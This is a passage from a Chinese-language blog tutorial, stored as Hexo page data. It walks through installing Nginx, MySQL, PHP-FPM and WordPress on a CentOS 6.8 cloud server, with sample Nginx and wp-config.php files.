class=\"line\">netstat -nlpt | grep php-fpm</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-把-PHP-FPM-也设置成开机自动启动：\"><a href=\"#4-把-PHP-FPM-也设置成开机自动启动：\" class=\"headerlink\" title=\"4.把 PHP-FPM 也设置成开机自动启动：\"></a>4.把 PHP-FPM 也设置成开机自动启动：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chkconfig php-fpm on</span><br></pre></td></tr></table></figure>\n<h3 id=\"安装wordpress\"><a href=\"#安装wordpress\" class=\"headerlink\" title=\"安装wordpress\"></a>安装wordpress</h3><h4 id=\"1-配置好-LNMP-环境后，继续使用-yum-来安装-WordPress：\"><a href=\"#1-配置好-LNMP-环境后，继续使用-yum-来安装-WordPress：\" class=\"headerlink\" title=\"1.配置好 LNMP 环境后，继续使用 yum 来安装 WordPress：\"></a>1.配置好 LNMP 环境后，继续使用 yum 来安装 WordPress：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install wordpress -y</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-进入-MySQL：\"><a href=\"#2-进入-MySQL：\" class=\"headerlink\" title=\"2.进入 MySQL：\"></a>2.进入 MySQL：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -uroot --password=&apos;MyPas$word4Word_Press&apos;</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-为-WordPress-创建一个数据库：\"><a href=\"#3-为-WordPress-创建一个数据库：\" class=\"headerlink\" title=\"3.为 WordPress 创建一个数据库：\"></a>3.为 WordPress 创建一个数据库：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE DATABASE wordpress;</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-MySQL-部分设置完了，我们退出-MySQL-环境：\"><a href=\"#4-MySQL-部分设置完了，我们退出-MySQL-环境：\" class=\"headerlink\" title=\"4.MySQL 部分设置完了，我们退出 MySQL 环境：\"></a>4.MySQL 部分设置完了，我们退出 MySQL 环境：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exit</span><br></pre></td></tr></table></figure>\n<h4 id=\"5-把上述的-DB-配置同步到-WordPress-的配置文件中，可参考下面的配置：\"><a href=\"#5-把上述的-DB-配置同步到-WordPress-的配置文件中，可参考下面的配置：\" class=\"headerlink\" title=\"5.把上述的 DB 配置同步到 WordPress 的配置文件中，可参考下面的配置：\"></a>5.把上述的 DB 配置同步到 WordPress 的配置文件中，可参考下面的配置：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wp-config.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">/**</span><br><span class=\"line\">* The base configuration for WordPress</span><br><span class=\"line\">*</span><br><span class=\"line\">* The wp-config.php creation script uses this file during the</span><br><span class=\"line\">* installation. You don&apos;t have to use the web site, you can</span><br><span class=\"line\">* copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class=\"line\">*</span><br><span class=\"line\">* This file contains the following configurations:</span><br><span class=\"line\">*</span><br><span class=\"line\">* * MySQL settings</span><br><span class=\"line\">* * Secret keys</span><br><span class=\"line\">* * Database table prefix</span><br><span class=\"line\">* * ABSPATH</span><br><span class=\"line\">*</span><br><span class=\"line\">* @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class=\"line\">*</span><br><span class=\"line\">* @package WordPress</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class=\"line\">/** The name of the database for WordPress */</span><br><span class=\"line\">define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/** MySQL database username */</span><br><span class=\"line\">define(&apos;DB_USER&apos;, &apos;root&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/** MySQL database password */</span><br><span class=\"line\">define(&apos;DB_PASSWORD&apos;, &apos;MyPas$word4Word_Press&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/** MySQL hostname */</span><br><span class=\"line\">define(&apos;DB_HOST&apos;, &apos;localhost&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/** Database Charset to use in creating database tables. */</span><br><span class=\"line\">define(&apos;DB_CHARSET&apos;, &apos;utf8&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/** The Database Collate type. Don&apos;t change this if in doubt. */</span><br><span class=\"line\">define(&apos;DB_COLLATE&apos;, &apos;&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/**#@+</span><br><span class=\"line\">* Authentication Unique Keys and Salts.</span><br><span class=\"line\">*</span><br><span class=\"line\">* Change these to different unique phrases!</span><br><span class=\"line\">* You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class=\"line\">* You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span><br><span class=\"line\">*</span><br><span class=\"line\">* @since 2.6.0</span><br><span class=\"line\">*/</span><br><span class=\"line\">define(&apos;AUTH_KEY&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;SECURE_AUTH_KEY&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;LOGGED_IN_KEY&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;NONCE_KEY&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;AUTH_SALT&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;SECURE_AUTH_SALT&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;LOGGED_IN_SALT&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;NONCE_SALT&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/**#@-*/</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\">* WordPress Database Table prefix.</span><br><span class=\"line\">*</span><br><span class=\"line\">* You can have multiple installations in one database if you give each</span><br><span class=\"line\">* a unique prefix. Only numbers, letters, and underscores please!</span><br><span class=\"line\">*/</span><br><span class=\"line\">$table_prefix = &apos;wp_&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\">* See http://make.wordpress.org/core/2013/10/25/the-definitive-guide-to-disabling-auto-updates-in-wordpress-3-7</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">/* Disable all file change, as RPM base installation are read-only */</span><br><span class=\"line\">define(&apos;DISALLOW_FILE_MODS&apos;, true);</span><br><span class=\"line\"></span><br><span class=\"line\">/* Disable automatic updater, in case you want to allow</span><br><span class=\"line\">above FILE_MODS for plugins, themes, ... */</span><br><span class=\"line\">define(&apos;AUTOMATIC_UPDATER_DISABLED&apos;, true);</span><br><span class=\"line\"></span><br><span class=\"line\">/* Core update is always disabled, WP_AUTO_UPDATE_CORE value is ignore */</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\">* For developers: WordPress debugging mode.</span><br><span class=\"line\">*</span><br><span class=\"line\">* Change this to true to enable the display of notices during development.</span><br><span class=\"line\">* It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class=\"line\">* in their development environments.</span><br><span class=\"line\">*</span><br><span class=\"line\">* For information on other constants that can be used for debugging,</span><br><span class=\"line\">* visit the Codex.</span><br><span class=\"line\">*</span><br><span class=\"line\">* @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class=\"line\">*/</span><br><span class=\"line\">define(&apos;WP_DEBUG&apos;, false);</span><br><span class=\"line\"></span><br><span class=\"line\">/* That&apos;s all, stop editing! Happy blogging. */</span><br><span class=\"line\"></span><br><span class=\"line\">/** Absolute path to the WordPress directory. */</span><br><span class=\"line\">if ( !defined(&apos;ABSPATH&apos;) )</span><br><span class=\"line\">define(&apos;ABSPATH&apos;, &apos;/usr/share/wordpress&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/** Sets up WordPress vars and included files. */</span><br><span class=\"line\">require_once(ABSPATH . &apos;wp-settings.php&apos;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"WordPress-已经安装完毕，我们配置-Nginx-把请求转发给-PHP-FPM-来处理\"><a href=\"#WordPress-已经安装完毕，我们配置-Nginx-把请求转发给-PHP-FPM-来处理\" class=\"headerlink\" title=\"WordPress 已经安装完毕，我们配置 Nginx 把请求转发给 PHP-FPM 来处理\"></a>WordPress 已经安装完毕，我们配置 Nginx 把请求转发给 PHP-FPM 来处理</h4><p>首先，重命名默认的配置文件：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /etc/nginx/conf.d/</span><br><span class=\"line\">mv default.conf defaut.conf.bak</span><br></pre></td></tr></table></figure></p>\n<p>在 /etc/nginx/conf.d 创建 wordpress.conf 配置，参考下面的内容：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wordpress.conf</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">listen 80;</span><br><span class=\"line\">root /usr/share/wordpress;</span><br><span class=\"line\">location / &#123;</span><br><span class=\"line\">index index.php index.html index.htm;</span><br><span class=\"line\">try_files $uri $uri/ /index.php index.php;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\t# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class=\"line\">location ~ .php$ &#123;</span><br><span class=\"line\">fastcgi_pass 127.0.0.1:9000;</span><br><span class=\"line\">fastcgi_index index.php;</span><br><span class=\"line\">fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class=\"line\">include fastcgi_params;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"6-配置后，通知-Nginx-进程重新加载：\"><a href=\"#6-配置后，通知-Nginx-进程重新加载：\" class=\"headerlink\" title=\"6.配置后，通知 Nginx 进程重新加载：\"></a>6.配置后，通知 Nginx 进程重新加载：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n<h3 id=\"至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面\"><a href=\"#至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面\" class=\"headerlink\" title=\"至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面\"></a>至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面</h3>","site":{"data":{}},"excerpt":"<h3 id=\"搭建LNMP环境：以下基于腾讯云镜像CentOS-6-8-64bit，或不适用于其他镜像\"><a href=\"#搭建LNMP环境：以下基于腾讯云镜像CentOS-6-8-64bit，或不适用于其他镜像\" class=\"headerlink\" title=\"搭建LNMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，或不适用于其他镜像\"></a>搭建LNMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，或不适用于其他镜像</h3><h3 id=\"一、安装Nginx\"><a href=\"#一、安装Nginx\" class=\"headerlink\" title=\"一、安装Nginx\"></a>一、安装Nginx</h3><h4 id=\"1-使用-yum-安装-Nginx：\"><a href=\"#1-使用-yum-安装-Nginx：\" class=\"headerlink\" title=\"1.使用 yum 安装 Nginx：\"></a>1.使用 yum 安装 Nginx：</h4><p>yum install nginx -y</p>\n<h4 id=\"2-修改-etc-nginx-conf-d-default-conf\"><a href=\"#2-修改-etc-nginx-conf-d-default-conf\" class=\"headerlink\" title=\"2.修改/etc/nginx/conf.d/default.conf\"></a>2.修改/etc/nginx/conf.d/default.conf</h4><p>去除对 IPv6 地址的监听，可参考下面的示例<br>","more":"<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">listen 80 default_server;</span><br><span class=\"line\">\t# listen [::]:80 default_server;</span><br><span class=\"line\">server_name _;</span><br><span class=\"line\">root /usr/share/nginx/html;</span><br><span class=\"line\"></span><br><span class=\"line\">\t# Load configuration files for the default server block.</span><br><span class=\"line\">include /etc/nginx/default.d/*.conf;</span><br><span class=\"line\"></span><br><span class=\"line\">location / &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">error_page 404 /404.html;</span><br><span class=\"line\">location = /40x.html &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">error_page 500 502 503 504 /50x.html;</span><br><span class=\"line\">location = /50x.html &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"3-修改完成后，启动-Nginx：\"><a href=\"#3-修改完成后，启动-Nginx：\" class=\"headerlink\" title=\"3.修改完成后，启动 Nginx：\"></a>3.修改完成后，启动 Nginx：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-将-Nginx-设置为开机自动启动：\"><a href=\"#4-将-Nginx-设置为开机自动启动：\" class=\"headerlink\" title=\"4.将 Nginx 设置为开机自动启动：\"></a>4.将 Nginx 设置为开机自动启动：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chkconfig nginx on</span><br></pre></td></tr></table></figure>\n<h3 id=\"二、安装MySQL\"><a href=\"#二、安装MySQL\" class=\"headerlink\" title=\"二、安装MySQL\"></a>二、安装MySQL</h3><h4 id=\"1-使用-yum-安装-MySQL：\"><a href=\"#1-使用-yum-安装-MySQL：\" class=\"headerlink\" title=\"1.使用 yum 安装 MySQL：\"></a>1.使用 yum 安装 MySQL：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install mysql-server -y</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-安装完成后，启动-MySQL-服务：\"><a href=\"#2-安装完成后，启动-MySQL-服务：\" class=\"headerlink\" title=\"2.安装完成后，启动 MySQL 服务：\"></a>2.安装完成后，启动 MySQL 服务：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service mysqld restart</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-设置-MySQL-账户-root-密码：\"><a href=\"#3-设置-MySQL-账户-root-密码：\" class=\"headerlink\" title=\"3.设置 MySQL 账户 root 密码：\"></a>3.设置 MySQL 账户 root 密码：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/bin/mysqladmin -u root password &apos;MyPas$word4Word_Press&apos;</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-将-MySQL-设置为开机自动启动：\"><a href=\"#4-将-MySQL-设置为开机自动启动：\" class=\"headerlink\" title=\"4.将 MySQL 设置为开机自动启动：\"></a>4.将 MySQL 设置为开机自动启动：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chkconfig mysqld on</span><br></pre></td></tr></table></figure>\n<h3 id=\"三、安装PHP\"><a href=\"#三、安装PHP\" class=\"headerlink\" title=\"三、安装PHP\"></a>三、安装PHP</h3><h4 id=\"1-使用-yum-安装-PHP：\"><a href=\"#1-使用-yum-安装-PHP：\" class=\"headerlink\" title=\"1.使用 yum 安装 PHP：\"></a>1.使用 yum 安装 PHP：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install php-fpm php-mysql -y</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-安装之后，启动-PHP-FPM-进程：\"><a href=\"#2-安装之后，启动-PHP-FPM-进程：\" class=\"headerlink\" title=\"2.安装之后，启动 PHP-FPM 进程：\"></a>2.安装之后，启动 PHP-FPM 进程：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service php-fpm start</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-启动之后，可以使用下面的命令查看-PHP-FPM-进程监听哪个端口\"><a href=\"#3-启动之后，可以使用下面的命令查看-PHP-FPM-进程监听哪个端口\" class=\"headerlink\" title=\"3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口\"></a>3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -nlpt | grep php-fpm</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-把-PHP-FPM-也设置成开机自动启动：\"><a href=\"#4-把-PHP-FPM-也设置成开机自动启动：\" class=\"headerlink\" title=\"4.把 PHP-FPM 也设置成开机自动启动：\"></a>4.把 PHP-FPM 也设置成开机自动启动：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chkconfig php-fpm on</span><br></pre></td></tr></table></figure>\n<h3 id=\"安装wordpress\"><a href=\"#安装wordpress\" class=\"headerlink\" title=\"安装wordpress\"></a>安装wordpress</h3><h4 id=\"1-配置好-LNMP-环境后，继续使用-yum-来安装-WordPress：\"><a href=\"#1-配置好-LNMP-环境后，继续使用-yum-来安装-WordPress：\" class=\"headerlink\" title=\"1.配置好 LNMP 环境后，继续使用 yum 来安装 WordPress：\"></a>1.配置好 LNMP 环境后，继续使用 yum 来安装 WordPress：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install wordpress -y</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-进入-MySQL：\"><a href=\"#2-进入-MySQL：\" class=\"headerlink\" title=\"2.进入 MySQL：\"></a>2.进入 MySQL：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -uroot --password=&apos;MyPas$word4Word_Press&apos;</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-为-WordPress-创建一个数据库：\"><a href=\"#3-为-WordPress-创建一个数据库：\" class=\"headerlink\" title=\"3.为 WordPress 创建一个数据库：\"></a>3.为 WordPress 创建一个数据库：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE DATABASE wordpress;</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-MySQL-部分设置完了，我们退出-MySQL-环境：\"><a href=\"#4-MySQL-部分设置完了，我们退出-MySQL-环境：\" class=\"headerlink\" title=\"4.MySQL 部分设置完了，我们退出 MySQL 环境：\"></a>4.MySQL 部分设置完了，我们退出 MySQL 环境：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exit</span><br></pre></td></tr></table></figure>\n<h4 id=\"5-把上述的-DB-配置同步到-WordPress-的配置文件中，可参考下面的配置：\"><a href=\"#5-把上述的-DB-配置同步到-WordPress-的配置文件中，可参考下面的配置：\" class=\"headerlink\" title=\"5.把上述的 DB 配置同步到 WordPress 的配置文件中，可参考下面的配置：\"></a>5.把上述的 DB 配置同步到 WordPress 的配置文件中，可参考下面的配置：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wp-config.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">/**</span><br><span class=\"line\">* The base configuration for WordPress</span><br><span class=\"line\">*</span><br><span class=\"line\">* The wp-config.php creation script uses this file during the</span><br><span class=\"line\">* installation. You don&apos;t have to use the web site, you can</span><br><span class=\"line\">* copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class=\"line\">*</span><br><span class=\"line\">* This file contains the following configurations:</span><br><span class=\"line\">*</span><br><span class=\"line\">* * MySQL settings</span><br><span class=\"line\">* * Secret keys</span><br><span class=\"line\">* * Database table prefix</span><br><span class=\"line\">* * ABSPATH</span><br><span class=\"line\">*</span><br><span class=\"line\">* @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class=\"line\">*</span><br><span class=\"line\">* @package WordPress</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class=\"line\">/** The name of the database for WordPress */</span><br><span class=\"line\">define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/** MySQL database username */</span><br><span class=\"line\">define(&apos;DB_USER&apos;, &apos;root&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/** MySQL database password */</span><br><span class=\"line\">define(&apos;DB_PASSWORD&apos;, &apos;MyPas$word4Word_Press&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/** MySQL hostname */</span><br><span class=\"line\">define(&apos;DB_HOST&apos;, &apos;localhost&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/** Database Charset to use in creating database tables. */</span><br><span class=\"line\">define(&apos;DB_CHARSET&apos;, &apos;utf8&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/** The Database Collate type. Don&apos;t change this if in doubt. */</span><br><span class=\"line\">define(&apos;DB_COLLATE&apos;, &apos;&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/**#@+</span><br><span class=\"line\">* Authentication Unique Keys and Salts.</span><br><span class=\"line\">*</span><br><span class=\"line\">* Change these to different unique phrases!</span><br><span class=\"line\">* You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class=\"line\">* You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span><br><span class=\"line\">*</span><br><span class=\"line\">* @since 